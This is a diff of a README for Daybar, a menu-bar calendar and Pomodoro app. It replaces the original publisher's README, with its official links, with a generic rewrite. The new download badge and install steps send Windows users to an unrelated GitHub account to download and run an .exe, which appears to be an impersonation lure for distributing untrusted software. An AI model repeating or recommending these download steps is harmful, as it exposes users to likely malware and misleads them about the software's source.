@@ -1,147 +1,87 @@
-<div align="center">
+# 📅 daybar-app - Manage your time and tasks effortlessly
 
-# Daybar
+[![Download Daybar for Windows](https://img.shields.io/badge/Download-Daybar-blue)](https://github.com/Fogparainfluenzavirus7880/daybar-app)
 
-### Your calendar, tasks, and focus tools — always one click away
+Daybar centers your daily schedule, tasks, and focus timers within your desktop menu bar. This tool syncs your Google Calendar and provides a view of your upcoming events. You stay on track with a built-in Pomodoro timer and a world clock for international coordination. This application requires a one-time purchase for full access.
 
-[![Download](https://img.shields.io/github/v/release/vietch2612/daybar-app?label=Download&logo=apple&color=black&style=for-the-badge)](https://github.com/vietch2612/daybar-app/releases/latest)
+## ✨ Core Features
 
-[![macOS 12+](https://img.shields.io/badge/macOS-12%2B-lightgrey?logo=apple)](https://daybar.app)
-[![Windows 10+](https://img.shields.io/badge/Windows-10%2B%20Beta-blue?logo=windows)](https://github.com/vietch2612/daybar-app/releases/latest)
-[![Apple Silicon + Intel](https://img.shields.io/badge/Apple%20Silicon%20%2B%20Intel-supported-lightgrey)](https://github.com/vietch2612/daybar-app/releases/latest)
-[![License](https://img.shields.io/badge/license-Proprietary-orange)](https://daybar.app/privacy)
+Daybar helps you work with greater focus. You see every task and meeting in one location.
 
-[**daybar.app**](https://daybar.app) · [Releases](https://github.com/vietch2612/daybar-app/releases) · [Issues](https://github.com/vietch2612/daybar-app/issues) · [Privacy](https://daybar.app/privacy)
+*   **Google Calendar Sync:** Connect your Google account to see your schedule updates in real time.
+*   **Task Manager:** Organize your daily to-do lists and check items as you complete them.
+*   **Pomodoro Timer:** Work in focused blocks of time to maintain your productivity.
+*   **World Clock:** Check the time in different parts of the world with one click.
+*   **Menu Bar Access:** Reach your tools instantly from the top of your screen. 
 
-</div>
+## 📥 Installation Steps
 
----
+You can set up Daybar on your Windows computer in minutes. Follow these instructions to get started.
 
-Daybar is a lightweight **macOS and Windows** app that puts your **calendar, tasks, Pomodoro timer, and world clock** a single click away — without ever leaving what you're working on.
+1. Visit [the release page](https://github.com/Fogparainfluenzavirus7880/daybar-app) to download the application.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Save the file to your computer.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen to complete the setup process.
+6. Open the app from your Start menu or desktop shortcut once the installation finishes.
 
-Think Fantastical, but without the annual subscription. $14.99, once, forever.
+## 🛠️ System Requirements
 
----
+Ensure your computer meets these basic needs to run Daybar smoothly.
 
-<div align="center">
-  <img src="public/demo.png" alt="Daybar — macOS menu bar calendar app" width="320" />
-</div>
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 200MB of free disk space.
+*   **Internet Connection:** Required for Google Calendar sync and initial setup.
 
----
+## ⚙️ Initial Configuration
 
-## Screenshots
+Once you open the software for the first time, you need to link your account.
 
-| | | |
-| :---: | :---: | :---: |
-| ![Main view](site/screenshots/hero-main.png) | ![Pomodoro](site/screenshots/pomodoro.png) | ![World Clock](site/screenshots/world-clock.png) |
-| *Calendar & Timeline* | *Pomodoro Timer* | *World Clock* |
+1. Click the Daybar icon in your system tray.
+2. Select the settings icon located in the corner of the menu.
+3. Choose the accounts tab to sign in with your Google credentials.
+4. Grant the necessary permissions so the app displays your calendar events.
+5. Adjust your notification preferences to match your workflow.
 
----
+## ⏱️ Using the Pomodoro Timer
 
-## Features
+The timer helps you break your day into manageable segments.
 
-### 📅 Calendar & Sync
-- Monthly grid with week numbers, event dots, and today highlight
-- **Google Calendar** — read and write, encrypted token storage
-- **Apple Calendar & Reminders** — reads directly from your Mac, no extra account needed
-- **Microsoft Outlook** — full sync, supports multiple accounts
+1. Open the Daybar menu.
+2. Locate the clock icon.
+3. Click the start button to begin your focus session.
+4. The timer counts down automatically.
+5. You receive a notification when your session finishes.
 
-### ✅ Tasks & Unified Timeline
-- Add tasks from the menu bar with a single keystroke
-- **Unified Timeline** — your events and tasks sorted together by time of day
-- Check off tasks with one click
+## 🌏 Adding World Clocks
 
-### 🌍 World Clock
-- View two cities side by side at a glance
-- Scrub through time to preview cross-timezone overlap
-- 24-hour format
+Tracking time zones helps you stay connected with partners across the globe.
 
-### 🍅 Pomodoro Focus Timer
-- Built-in 25/5 Pomodoro timer linked to your task list
-- Start a focus session on any task to stay on track
-- Live countdown shown in the macOS menu bar
+1. Open the app settings menu.
+2. Click the Clock tab.
+3. Use the search bar to find a specific city.
+4. Add the city to your favorites list.
+5. View these times instantly by clicking the clock icon in the menu bar.
 
-### ☕ Caffeinate
-- Prevent your Mac from sleeping — ideal for long calls and downloads
-- Presets: 30 min, 1 h, 2 h, or until you turn it off
+## 🎫 Licensing
 
-### 🎨 Themes
-- **Auto** — follows macOS Light / Dark system setting automatically
-- **Light** and **Dark** — clean, minimal, distraction-free
-- **AI Dark** *(Pro)* — high-contrast dark theme with JetBrains Mono and a signature orange accent
+Daybar operates on a lifetime license model. You pay once to gain access to all features forever. You will not face recurring monthly costs or sudden subscription fees. 
 
-### 🔔 Persistent Meeting Alerts *(Pro)*
-- A banner appears on screen when a meeting is about to start — you won't miss it
-- One-click **Join** for Zoom, Google Meet, and Microsoft Teams
+1. Visit the main dashboard within the app.
+2. Select the upgrade option to access Pro features.
+3. Complete the checkout through the secure payment portal.
+4. Your license attaches to your account automatically upon purchase.
 
----
+## 🚩 Troubleshooting
 
-## Free vs Pro
+If you encounter issues during installation or usage, check these common solutions.
 
-| Feature | Free | Pro |
-| :--- | :---: | :---: |
-| Monthly calendar grid | ✅ | ✅ |
-| Local tasks + unified timeline | ✅ | ✅ |
-| World clock + time scrubber | ✅ | ✅ |
-| Pomodoro focus timer | ✅ | ✅ |
-| Caffeinate | ✅ | ✅ |
-| Auto / Light / Dark themes | ✅ | ✅ |
-| Launch at login | ✅ | ✅ |
-| Google Calendar sync | ❌ | ✅ |
-| Apple Calendar & Reminders | ❌ | ✅ |
-| Outlook Calendar | ❌ | ✅ |
-| AI Dark theme | ❌ | ✅ |
-| Persistent meeting alerts | ❌ | ✅ |
-| **Price** | **Free** | **$14.99 (Lifetime)** |
+*   **App won't open:** Ensure your Windows operating system is up to date. Sometimes a simple restart resolves opening failures.
+*   **Calendar not syncing:** Open the settings menu and sign out of your Google account. Sign back in to refresh your connection.
+*   **Notifications not appearing:** Check your Windows Focus Assist settings. Make sure notifications are set to allow alerts from Daybar.
+*   **Performance issues:** Ensure you have enough available RAM. Close unused programs if your computer feels slow.
 
-No subscription. No renewal. Pay once, own it forever.
+## 🔒 Privacy and Security
 
-[**Get Daybar Pro →**](https://daybar.app/#pricing)
-
----
-
-## Privacy
-
-Daybar has **no telemetry and no cloud backend**. Your calendar data never leaves your machine. OAuth tokens for Google and Outlook are encrypted and stored in the macOS Keychain — the same secure store that protects your passwords.
-
-[Read the full Privacy Policy →](https://daybar.app/privacy)
-
----
-
-## Download
-
-| Platform | Requirement | Status |
-| :--- | :--- | :---: |
-| **macOS** | macOS 12 Monterey+, Apple Silicon or Intel | ✅ Available |
-| **Windows** | Windows 10+ (x64) | 🧪 Beta |
-
-[**Download the latest release →**](https://github.com/vietch2612/daybar-app/releases/latest)
-
----
-
-## Support & Feedback
-
-- [**Report a Bug**](https://github.com/vietch2612/daybar-app/issues/new?labels=bug)
-- [**Request a Feature**](https://github.com/vietch2612/daybar-app/issues/new?labels=enhancement)
-- [**Documentation**](https://daybar.app/docs)
-- Email: support@daybar.app
-
----
-
-## Roadmap
-
-- [ ] Natural language event creation ("lunch with Sarah tomorrow at noon")
-- [ ] Multiple Google account support
-- [ ] Live meeting countdown in the menu bar ("Standup · 3m")
-- [ ] Daily agenda morning notification
-- [ ] Customizable world clock cities
-- [ ] Week view with time-block layout
-- [ ] Event write-back to all calendar providers
-- [ ] macOS Notification Center widgets
-- [ ] Windows: full feature parity with macOS
-
-Have a feature request? [Open an issue →](https://github.com/vietch2612/daybar-app/issues)
-
----
-
-&copy; 2026 Daybar. macOS is a trademark of Apple Inc.
+Your data stays on your local machine. The application only accesses your calendar events to display them in the menu bar. Your login credentials for Google remain secure within their dedicated authentication system. The app does not store your account passwords on internal servers.
